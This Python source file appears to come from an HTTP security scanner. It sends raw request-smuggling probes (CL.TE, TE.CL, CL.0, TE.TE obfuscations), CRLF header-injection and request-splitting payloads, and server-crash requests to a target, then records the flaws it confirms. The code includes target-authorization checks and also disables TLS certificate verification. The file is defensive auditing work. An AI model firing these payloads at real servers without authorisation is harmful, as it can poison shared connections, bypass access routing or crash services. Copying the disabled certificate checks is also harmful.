"""
Active Flaw Prober: Canonical PortSwigger & Protocol Research Attack Suite.

Directly tests target endpoints (origin servers, reverse proxies, and CDNs)
against canonical, verified HTTP desynchronization and framing vulnerability primitives:
1. CL.TE Dual-Header Timeout & Desync
2. TE.CL Dual-Header Timeout & Desync
3. CL.0 Request Queue Poisoning (GET/HEAD with Content-Length)
4. 36 Transfer-Encoding Obfuscation Mutators (TE.TE)
5. CRLF Request Header Injection (RHI & Path/Query splitting)
6. Protocol Ruler Buffer Cliff & Overlong Transformation Measurement
7. Server Fault / Crash / Unhandled 500 Detection
"""

import socket
import ssl
import time
from typing import Any, Callable, Dict, List, Optional, Tuple

from anomaly_detector import AnomalyDetector
from database import Database
from engine.causal_classifier import CausalAnomalyClassifier
from engine.delta_debugger import DeltaDebugger
from engine.http_framing import HTTPFramingReader
from engine.sequence_engine import StatefulProtocolSequenceEngine
from engine.taxonomy import AnomalyCategory, ImpactClass, ImplementationAnomaly, ReproducibleVulnerability
from permutator import VectorPermutator


class ActiveFlawProber:
    """
    Executes an active, multi-vector protocol security audit against target hosts,
    ensuring verified vulnerabilities are discovered, minimized, and recorded.
    """

    def __init__(
        self,
        host: str,
        port: int = 80,
        use_tls: bool = False,
        timeout: float = 3.5,
        db: Optional[Database] = None,
        on_trace: Optional[Callable[[str], None]] = None,
    ):
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.db = db
        self.on_trace = on_trace or print
        self.seq_engine = StatefulProtocolSequenceEngine(default_timeout=timeout)
        self.debugger = DeltaDebugger(target_host=host, target_port=port, default_timeout=timeout, use_tls=use_tls)
        self.classifier = CausalAnomalyClassifier()
        self.permutator = VectorPermutator(db=db)

    def _open_connection(self) -> socket.socket:
        is_local = self.host in ("127.0.0.1", "localhost", "::1", "[::1]") or self.host.startswith("127.")
        from engine.safe_network_validator import validate_target_host
        is_safe, reason = validate_target_host(self.host, allow_private=is_local)
        if not is_safe:
            raise PermissionError(f"Target '{self.host}' rejected by SSRF safety boundary: {reason}")
        from mcp_server import TargetAuthorizationGate
        TargetAuthorizationGate.check_target(self.host)
        raw_sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        if self.use_tls:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            return context.wrap_socket(raw_sock, server_hostname=self.host)
        return raw_sock

    def get_canonical_attack_probes(self) -> List[Tuple[str, str, bytes]]:
        """
        Returns structured tuples of (Vector_Name, Category, Raw_Bytes).
        """
        h = self.host
        probes: List[Tuple[str, str, bytes]] = []

        # 1. Canonical CL.TE Probe
        cl_te = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {h}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: 4\r\n"
            f"Connection: keep-alive\r\n\r\n"
            f"1\r\nZ\r\nQ\r\n\r\n"
        ).encode("latin-1")
        probes.append(("CL.TE Dual-Header Timeout Probe", "CL.TE", cl_te))

        # 2. Canonical TE.CL Probe
        te_cl = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {h}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n\r\n"
            f"0\r\n\r\nX"
        ).encode("latin-1")
        probes.append(("TE.CL Dual-Header Timeout Probe", "TE.CL", te_cl))

        # 3. Canonical CL.0 Request Poisoning Probe (GET with Content-Length)
        smuggled_prefix = f"GET /terminator_marker_8821 HTTP/1.1\r\nHost: {h}\r\nX-Ignore: 1\r\n\r\n"
        cl0_body = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {h}\r\n"
            f"Content-Length: {len(smuggled_prefix)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
            + smuggled_prefix
        ).encode("latin-1")
        probes.append(("CL.0 GET Request Queue Poisoning Probe", "CL.0", cl0_body))

        # 4. Canonical CL.0 HEAD Request Desync Probe
        cl0_head = (
            f"HEAD / HTTP/1.1\r\n"
            f"Host: {h}\r\n"
            f"Content-Length: {len(smuggled_prefix)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
            + smuggled_prefix
        ).encode("latin-1")
        probes.append(("CL.0 HEAD Request Queue Poisoning Probe", "CL.0", cl0_head))

        # 5. Core Transfer-Encoding Obfuscation Mutators (TE.TE)
        te_mutations = [
            ("TE.TE Space Before Colon", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding : chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
            ("TE.TE Tab Separator", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding:\tchunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
            ("TE.TE Vertical Tab (VT)", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding:\x0bchunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
            ("TE.TE Dual Header Duplicate", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
            ("TE.TE Identity Override", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
            ("TE.TE Pre-Header Wrapping", f"POST / HTTP/1.1\r\nHost: {h}\r\n X: X\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
            ("TE.TE Chunk Extension Semicolon", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1;ext=term\r\nZ\r\nQ\r\n\r\n"),
            ("TE.TE Underline Header Casing", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer_Encoding: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
        ]
        for name, req_str in te_mutations:
            probes.append((name, "TE.TE", req_str.encode("latin-1")))

        # 6. CRLF Request Header Injection Probes (Tom Stacey Primitives)
        crlf_probes = [
            ("CRLF Query Parameter Header Injection", "CRLF-RHI", f"GET /?id=1%0d%0aX-Terminator-Injected:%20Verified HTTP/1.1\r\nHost: {h}\r\nConnection: close\r\n\r\n".encode("latin-1")),
            ("CRLF Path Request Splitting", "CRLF-RHI", f"GET /%20HTTP/1.1%0d%0aHost:%20{h}%0d%0a%0d%0aGET%20/marker HTTP/1.1\r\nHost: {h}\r\nConnection: close\r\n\r\n".encode("latin-1")),
            ("CRLF Routing Override Header Injection", "CRLF-RHI", f"GET / HTTP/1.1\r\nHost: {h}\r\nX-Original-URL: /admin%0d%0aX-Injected:%201\r\nConnection: close\r\n\r\n".encode("latin-1")),
            ("CRLF Cookie Request Header Injection", "CRLF-RHI", f"GET / HTTP/1.1\r\nHost: {h}\r\nCookie: session=1%0d%0aTransfer-Encoding:%20chunked\r\nConnection: close\r\n\r\n".encode("latin-1")),
        ]
        probes.extend(crlf_probes)

        # 7. Protocol Ruler Boundary & Transformation Probes
        ruler_probes = [
            ("Protocol Ruler Overlong UTF-8 Expansion (\\xc0\\x8a)", "RULER", f"GET / HTTP/1.1\r\nHost: {h}\r\nA: \\xc0\\x8a {'A' * 4096}\r\nConnection: close\r\n\r\n".encode("latin-1")),
            ("Protocol Ruler Ligature Contraction (\\xef\\xac\\x81)", "RULER", f"GET / HTTP/1.1\r\nHost: {h}\r\nA: \\xef\\xac\\x81 {'A' * 4096}\r\nConnection: close\r\n\r\n".encode("latin-1")),
            ("Protocol Ruler Obsolete Line Folding (\\r\\n )", "RULER", f"GET / HTTP/1.1\r\nHost: {h}\r\nA: FirstLine\r\n Continues\r\nConnection: close\r\n\r\n".encode("latin-1")),
        ]
        probes.extend(ruler_probes)

        # 8. Server Crash / Implementation Fault Probes (Extreme boundaries)
        crash_probes = [
            ("Huge Chunk Extension Integer Boundary", "CRASH", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked\r\n\r\n0x7fffffffffffffff\r\n\r\n".encode("latin-1")),
            ("Zero Content-Length With Trailing Body", "CRASH", f"POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\nUNEXPECTED_BODY_BYTES".encode("latin-1")),
        ]
        probes.extend(crash_probes)

        return probes

    def run_active_audit(self) -> List[ReproducibleVulnerability]:
        """
        Runs the canonical vulnerability suite against the target host.
        Returns a list of verified, confirmed ReproducibleVulnerability objects.
        """
        self.on_trace(f"\n{'='*75}")
        self.on_trace(f"[*] LAUNCHING CANONICAL ACTIVE FLAW VERIFICATION SUITE")
        self.on_trace(f"[*] Target: {'https' if self.use_tls else 'http'}://{self.host}:{self.port}")
        self.on_trace(f"{'='*75}")

        confirmed_vulns: List[ReproducibleVulnerability] = []
        attack_probes = self.get_canonical_attack_probes()

        for idx, (probe_name, category, probe_bytes) in enumerate(attack_probes, 1):
            self.on_trace(f"\n  [{idx:2d}/{len(attack_probes)}] Probing Vector: {probe_name} ({category})...")

            # 1. First test via Stateful Protocol Sequence Engine
            seq_report = self.seq_engine.run_pipelined_canary_sequence(
                self.host, self.port, probe_bytes, use_tls=self.use_tls
            )

            # 2. Check for CL.0 specifically if category is CL.0
            if category == "CL.0" and not seq_report.has_desynchronization:
                cl0_report = self.seq_engine.run_cl0_canary_sequence(
                    self.host, self.port, path="/", probe_body=f"GET /terminator_marker_8821 HTTP/1.1\r\nHost: {self.host}\r\nX-Ignore: 1\r\n\r\n".encode(), use_tls=self.use_tls
                )
                if cl0_report.has_desynchronization:
                    seq_report = cl0_report

            candidate_step = next((s for s in seq_report.steps if "Candidate" in s.step_name), None)
            resp_bytes = candidate_step.received_bytes if candidate_step else (seq_report.steps[-1].received_bytes if seq_report.steps else b"")
            status_code = candidate_step.status_code if candidate_step else 0

            detected_anomaly: Optional[ImplementationAnomaly] = None

            # Path A: Stateful Desynchronization / Pipeline Leak Confirmed
            if seq_report.has_desynchronization or seq_report.has_pipeline_leak:
                self.on_trace(f"      [!] STATEFUL DESYNCHRONIZATION DETECTED: {seq_report.details}")
                detected_anomaly = ImplementationAnomaly(
                    anomaly_id=f"ANOM-ACTIVE-{int(time.time() * 1000)}",
                    target_engine=f"{self.host}:{self.port}",
                    category=AnomalyCategory.PIPELINE_LEAK if seq_report.has_pipeline_leak else AnomalyCategory.SOCKET_HANG,
                    observed_behavior=seq_report.details,
                    expected_behavior="Clean request separation without socket hang or canary contamination.",
                    raw_probe=probe_bytes,
                    raw_response=resp_bytes,
                )

            # Path B: Anomaly Detection Cascade (CRLF, Double HTML, Inline Headers, 500 error)
            elif resp_bytes:
                if status_code == 500 or b"500 Internal" in resp_bytes:
                    self.on_trace("      [!] SERVER FAULT DETECTED: HTTP 500 Internal Server Error elicited by probe!")
                    detected_anomaly = ImplementationAnomaly(
                        anomaly_id=f"ANOM-ACTIVE-{int(time.time() * 1000)}",
                        target_engine=f"{self.host}:{self.port}",
                        category=AnomalyCategory.UNHANDLED_EXCEPTION,
                        observed_behavior=f"Unhandled Server Error (500) triggered by {probe_name}.",
                        expected_behavior="Handled request with appropriate 4xx client rejection.",
                        raw_probe=probe_bytes,
                        raw_response=resp_bytes,
                    )
                else:
                    cascade_anoms = AnomalyDetector.analyze_response(resp_bytes)
                    if cascade_anoms:
                        first = cascade_anoms[0]
                        self.on_trace(f"      [!] STRUCTURAL ANOMALY DETECTED: {first['type']} - {first['description']}")
                        detected_anomaly = ImplementationAnomaly(
                            anomaly_id=f"ANOM-ACTIVE-{int(time.time() * 1000)}",
                            target_engine=f"{self.host}:{self.port}",
                            category=AnomalyCategory.PARSER_DIVERGENCE,
                            observed_behavior=f"[{first['type']}] {first['description']}",
                            expected_behavior="Standard single HTTP response without structural anomaly.",
                            raw_probe=probe_bytes,
                            raw_response=resp_bytes,
                        )

            # If an anomaly was detected, pass through multi-trial DeltaDebugger verification!
            if detected_anomaly:
                self.on_trace(f"      [*] Verifying reproducibility across 3 trials (Protocol Research Reproducibility Invariant)...")
                vuln = self.debugger.minimize_and_reproduce(detected_anomaly, max_verification_trials=3)
                if vuln.reproducibility_rate >= 0.66:
                    self.on_trace(f"      [+] VULNERABILITY CONFIRMED: {vuln.vuln_id} ({vuln.impact.value}) - Repro Rate: {vuln.reproducibility_rate*100:.0f}%")
                    confirmed_vulns.append(vuln)
                    if self.db:
                        self.db.save_implementation_anomaly(
                            anomaly_id=detected_anomaly.anomaly_id,
                            target_engine=detected_anomaly.target_engine,
                            category=detected_anomaly.category.value,
                            observed_behavior=detected_anomaly.observed_behavior,
                            expected_behavior=detected_anomaly.expected_behavior,
                            raw_probe=detected_anomaly.raw_probe.decode("latin-1", errors="replace"),
                            raw_response=detected_anomaly.raw_response.decode("latin-1", errors="replace"),
                        )
                        self.db.save_reproducible_vulnerability(
                            vuln_id=vuln.vuln_id,
                            anomaly_id=detected_anomaly.anomaly_id,
                            impact=vuln.impact.value,
                            minimized_probe=vuln.minimized_probe.decode("latin-1", errors="replace"),
                            reproducibility_rate=vuln.reproducibility_rate,
                            verification_attempts=vuln.verification_attempts,
                            successful_reproductions=vuln.successful_reproductions,
                            delta_debug_steps=vuln.delta_debug_steps,
                            provenance_chain=vuln.provenance_chain,
                        )
                        self.db.record_evaluation(
                            probe_id=0,
                            target_host=self.host,
                            target_port=self.port,
                            is_vulnerable=True,
                            desync_class=vuln.impact.value,
                            details=f"Active Prober Verified: {detected_anomaly.observed_behavior}",
                            raw_evidence=f"PROBE:\n{vuln.minimized_probe.decode('latin-1', errors='replace')}\n\nRESP:\n{resp_bytes.decode('latin-1', errors='replace')[:500]}",
                        )
                else:
                    self.on_trace(f"      [-] Transient or flaked anomaly: Repro rate {vuln.reproducibility_rate*100:.0f}%, triaged.")
            else:
                self.on_trace(f"      [~] Target handled vector safely ({status_code} / {seq_report.details or 'normal'}).")

        self.on_trace(f"{'='*75}")
        self.on_trace(f"[*] ACTIVE AUDIT FINISHED: {len(confirmed_vulns)} confirmed vulnerabilities verified.")
        self.on_trace(f"{'='*75}\n")
        return confirmed_vulns
